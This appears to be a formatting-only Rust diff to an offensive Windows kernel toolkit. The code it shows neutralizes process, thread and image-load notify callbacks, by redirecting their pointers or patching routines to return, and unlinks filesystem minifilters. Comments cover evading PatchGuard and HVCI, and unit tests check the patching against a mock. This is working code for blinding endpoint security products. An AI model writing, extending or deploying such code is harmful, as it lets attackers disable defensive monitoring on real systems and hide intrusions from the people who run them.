@@ -73,11 +73,7 @@ impl CallbackNeutralizer {
     /// addresses (these drift across 17763 UBRs — a hardcoded RVA is a BSOD);
     /// the KernelRw must be a real kernel primitive. HVCI-on: code-page writes
     /// will return Err and the caller should fall back to `repurpose`.
-    fn neutralize_array(
-        &self,
-        krw: &dyn KernelRw,
-        array: NotifyArray,
-    ) -> Result<usize, KitError> {
+    fn neutralize_array(&self, krw: &dyn KernelRw, array: NotifyArray) -> Result<usize, KitError> {
         let base = self.array_kva(array)?;
         let mut count = 0usize;
         for i in 0..notify_routines::ARRAY_LEN {
@@ -139,7 +135,11 @@ impl CallbackKit for CallbackNeutralizer {
         // and PatchGuard detection. We skip it. All other slots are fair game
         // provided their context pointer and routine address pass validation.
         let mut total = 0usize;
-        for array in [NotifyArray::CreateProcess, NotifyArray::CreateThread, NotifyArray::LoadImage] {
+        for array in [
+            NotifyArray::CreateProcess,
+            NotifyArray::CreateThread,
+            NotifyArray::LoadImage,
+        ] {
             let base = self.array_kva(array)?;
             for i in 0..notify_routines::ARRAY_LEN {
                 // Selective targeting: skip callback slots whose routine pointer
@@ -156,8 +156,8 @@ impl CallbackKit for CallbackNeutralizer {
                 // Fallback (both == 0): skip only slot[0], the known
                 // dispatcher position. This preserves backward compatibility
                 // when the bootstrap hasn't resolved ntoskrnl bounds.
-                let skip_ntoskrnl = self.runtime.ntoskrnl_base != 0
-                    && self.runtime.ntoskrnl_size != 0;
+                let skip_ntoskrnl =
+                    self.runtime.ntoskrnl_base != 0 && self.runtime.ntoskrnl_size != 0;
                 let slot_kva = base + i * 8;
                 let packed = krw.kread_u64(slot_kva).map_err(KitError::from)?;
                 if !notify_routines::is_occupied(packed) {
@@ -191,7 +191,8 @@ impl CallbackKit for CallbackNeutralizer {
                 }
                 // DATA write: overwrite the routine pointer in the context block.
                 // HVCI-safe (non-paged pool data section, not code).
-                krw.kwrite_u64(ctx, redirect as u64).map_err(KitError::from)?;
+                krw.kwrite_u64(ctx, redirect as u64)
+                    .map_err(KitError::from)?;
                 total += 1;
             }
         }
@@ -221,11 +222,7 @@ impl MiniFilterUnlinker {
     /// `filter_kva` is the base of the `_FLT_FILTER`; its PrimaryLink is at
     /// `filter_kva + FLT_OBJECT_PRIMARY_LINK`. The caller (or a higher-level
     /// walk) supplies the resolved filter base.
-    pub fn unlink_filter(
-        &self,
-        krw: &dyn KernelRw,
-        filter_kva: usize,
-    ) -> Result<(), KitError> {
+    pub fn unlink_filter(&self, krw: &dyn KernelRw, filter_kva: usize) -> Result<(), KitError> {
         let link_kva = filter_kva + flt::FLT_OBJECT_PRIMARY_LINK;
         // LIST_ENTRY { Flink: *mut, Blink: *mut } — read both.
         let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
@@ -236,8 +233,10 @@ impl MiniFilterUnlinker {
             ));
         }
         // blink->Flink = flink ; flink->Blink = blink
-        krw.kwrite_u64(blink, flink as u64).map_err(KitError::from)?;
-        krw.kwrite_u64(flink + 8, blink as u64).map_err(KitError::from)?;
+        krw.kwrite_u64(blink, flink as u64)
+            .map_err(KitError::from)?;
+        krw.kwrite_u64(flink + 8, blink as u64)
+            .map_err(KitError::from)?;
         // Optionally self-loop the victim so a re-scan doesn't follow garbage.
         let _ = krw.kwrite_u64(link_kva, link_kva as u64);
         let _ = krw.kwrite_u64(link_kva + 8, link_kva as u64);
@@ -361,7 +360,9 @@ mod tests {
             ..Default::default()
         };
         let kit = CallbackNeutralizer { runtime };
-        let n = kit.neutralize_array(&krw, NotifyArray::CreateProcess).unwrap();
+        let n = kit
+            .neutralize_array(&krw, NotifyArray::CreateProcess)
+            .unwrap();
         assert_eq!(n, 2);
         // Both routines' first byte is now 0xC3.
         assert_eq!(krw.get_byte(routine_a as usize), 0xC3);
@@ -375,7 +376,7 @@ mod tests {
         // slot 0 occupied, slot 1 empty (0), slot 2 has ptr but no low bit.
         krw.set_u64(array_kva + 0 * 8, 0x2000 as u64 | 0x1);
         krw.set_u64(array_kva + 2 * 8, 0x3000 as u64); // no low bit
-        // Phase 1.1: routine address must be in kernel VA range (≥0xFFFF_8000_0000_0000)
+                                                       // Phase 1.1: routine address must be in kernel VA range (≥0xFFFF_8000_0000_0000)
         krw.set_u64(0x2000, 0xFFFF_8000_0000_5000);
 
         let runtime = RuntimeOffsets {
@@ -383,7 +384,9 @@ mod tests {
             ..Default::default()
         };
         let kit = CallbackNeutralizer { runtime };
-        let n = kit.neutralize_array(&krw, NotifyArray::CreateProcess).unwrap();
+        let n = kit
+            .neutralize_array(&krw, NotifyArray::CreateProcess)
+            .unwrap();
         assert_eq!(n, 1); // only slot 0
         assert_eq!(krw.get_byte(0xFFFF_8000_0000_5000), 0xC3);
     }
@@ -393,7 +396,9 @@ mod tests {
         // If the bootstrap didn't resolve the array KVA (0), the kit MUST
         // refuse rather than read/write garbage at address 0.
         let krw = MockKrw::new();
-        let kit = CallbackNeutralizer { runtime: RuntimeOffsets::default() };
+        let kit = CallbackNeutralizer {
+            runtime: RuntimeOffsets::default(),
+        };
         let r = kit.neutralize_array(&krw, NotifyArray::CreateProcess);
         assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
     }
